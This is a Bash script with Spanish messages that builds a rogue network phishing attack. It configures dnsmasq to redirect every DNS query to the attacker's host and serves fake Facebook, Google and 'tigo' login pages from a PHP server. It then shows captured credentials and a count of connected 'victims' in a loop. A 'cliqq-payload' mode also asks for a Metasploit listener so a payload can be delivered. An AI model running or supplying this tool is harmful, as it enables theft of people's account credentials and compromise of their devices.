#!/bin/bash

# Author telegram: @yarelbalcazar (M4r9hy)

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n[*]Saliendo...\n"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 1.5; ifconfig $choosed_interface down 2>/dev/null; sleep 1
	ifconfig $choosed_interface up 2>/dev/null; sleep 1
	tput cnorm; #service network-manager restart
	exit 0
}

function dependencies(){
	sleep 0.5; counter=0
	echo -e "\n[*]Comprobando programas necesarios...\n"
	sleep 1
	dependencias=(php dnsmasq hostapd)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e "[V]La herramienta $programa se encuentra instalada"
			let counter+=1
		else
			echo -e "[X]La herramienta $programa no se encuentra instalada"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n[*] Comenzando...\n"
		sleep 2
	else
		echo -e "\n[!] Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script\n"
		tput cnorm; exit
	fi
}

function getCredentials(){

	activeHosts=0
	tput civis; while true; do
		echo -e "\n[*] Esperando credenciales (Ctr+C para finalizar)...\n"
		for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
		echo -e "Víctimas conectadas: $activeHosts\n"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 2; clear
	done
}
function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi
    echo -e "\n[*] Listando interfaces de red disponibles..."; sleep 1
	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n$counter. $interface"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
	echo -ne "\n[*] Nombre de la interfaz (Ej: eth0): " && read choosed_interface
	for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n[!] La interfaz proporcionada no existe"; fi
	done
	#rm iface 2>/dev/null
	echo -e "\n[*] Configurar su eth0 a :\n\t\t Address 192.168.1.15 \n\t\t Netmask 255.255.255.0 \n\t\t Gateway 192.168.1.1\n\n [*]ENTER para continuar..." && read
	echo -e "\n[*] Configurando dnsmasq..."
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf #Interface enp0s25= Eth0 
	echo -e "dhcp-range=192.168.1.10,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0 	#Interface enp0s25= Eth0 
	 sleep 1
	 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	 sleep 1
	 dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	 sleep 3

	# Array de plantillas
	plantillas=(facebook-login google-login cliqq-payload tigo )

	tput cnorm; echo -ne "\n [Información] Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)\n\n"
	echo -ne "[*] Plantilla a utilizar (facebook-login , google-login , cliqq-payload , tigo): " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n[*] Montando servidor PHP..."
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 1
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n[*] Montando servidor PHP..."
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 1
		echo -e "\n[*] Configura desde otra consola un Listener en Metasploit de la siguiente forma:"
		for i in $(seq 1 45); do echo -ne "-"; done && echo -e ""
		cat setmsfconsole.rc
		for i in $(seq 1 45); do echo -ne "-"; done && echo -e ""
		echo -e "\n[!] Presiona <Enter> para continuar" && read
		popd > /dev/null 2>&1; getCredentials
	else
		tput civis; echo -e "\n[*] Usando plantilla personalizada..."; sleep 1
		echo -e "\n[*] Montando servidor web en $template\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 1
		popd > /dev/null 2>&1; getCredentials
	fi
}

function helpPanel(){
	echo -e "\nUso:"
	echo -e "\t[-m]} Modo de ejecución (terminal) [-m terminal ]" #| -m gui()]"
	exit 1
}

# Main Program

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis;
			dependencies
			startAttack
		fi
	fi
else
	echo -e "\n[!] Es necesario ser root para ejecutar la herramienta"
	exit 1
fi
